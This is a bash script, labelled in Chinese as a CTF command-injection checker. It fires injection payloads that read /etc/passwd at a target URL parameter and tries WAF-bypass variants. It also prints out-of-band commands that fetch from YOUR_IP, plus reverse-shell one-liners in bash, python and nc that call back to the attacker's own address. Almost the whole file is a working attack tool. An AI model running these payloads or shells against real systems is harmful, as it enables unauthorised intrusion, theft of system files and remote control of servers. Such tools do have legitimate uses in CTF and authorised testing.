#!/bin/bash
# CTF 命令注入检测
# 用法: bash cmdi.sh <URL> <PARAM>

URL="${1:?用法: bash cmdi.sh <URL> <PARAM>}"
PARAM="${2:-host}"

echo "=========================================="
echo "  命令注入检测: $URL ($PARAM)"
echo "=========================================="

urlencode() { /usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

echo -e "\n[1/4] 命令注入检测"
CMD_PAYLOADS=(
    ";id"
    "|id"
    "\$(id)"
    "\`id\`"
    "; whoami"
    "| whoami"
    "\$(whoami)"
    "|| id"
    "&& id"
    ";id;"
    "|cat /etc/passwd"
    ";cat /etc/passwd"
    "\$(cat /etc/passwd)"
    "127.0.0.1;id"
    "127.0.0.1|id"
    "127.0.0.1\$(id)"
    "127.0.0.1%0aid"
    "127.0.0.1%0a id"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    encoded=$(urlencode "$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qE "(uid=[0-9]+|root:|www-data)"; then
        echo -e "  \033[31m[!!!] 命令注入! Payload: $payload\033[0m"
        echo "$resp" | grep -oE "uid=[0-9]+.*" | head -1
        break
    fi
done

echo -e "\n[2/4] WAF绕过"
BYPASS_PAYLOADS=(
    "c'a't /etc/passwd"
    "c\"a\"t /etc/passwd"
    "cat\${IFS}/etc/passwd"
    "{cat,/etc/passwd}"
    "cat\$IFS/etc/passwd"
    "cat%09/etc/passwd"
    "cat%0a/etc/passwd"
    "c\$\{DEFAULT_ABC:-a\}t /etc/passwd"
    "\$(printf '\x63\x61\x74') /etc/passwd"
)

for payload in "${BYPASS_PAYLOADS[@]}"; do
    encoded=$(urlencode "127.0.0.1|$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qE "(root:|/bin/bash)"; then
        echo -e "  \033[31m[!] 绕过成功: $payload\033[0m"
        break
    fi
done

echo -e "\n[3/4] DNS/HTTP外带检测"
echo "  如果有DNS/HTTP外带能力:"
echo "  curl -sk \"$URL?$PARAM=127.0.0.1;ping -c1 YOUR_IP\""
echo "  curl -sk \"$URL?$PARAM=127.0.0.1;wget http://YOUR_IP/pwned\""
echo "  curl -sk \"$URL?$PARAM=127.0.0.1;curl http://YOUR_IP/pwned\""

echo -e "\n[4/4] 反弹Shell Payload"
MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
echo "  bash:  bash -i >& /dev/tcp/${MY_IP}/4444 0>&1"
echo "  python: /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${MY_IP}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
echo "  nc:     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${MY_IP} 4444 >/tmp/f"

echo -e "\n=========================================="
echo "命令注入检测完成"
echo "=========================================="
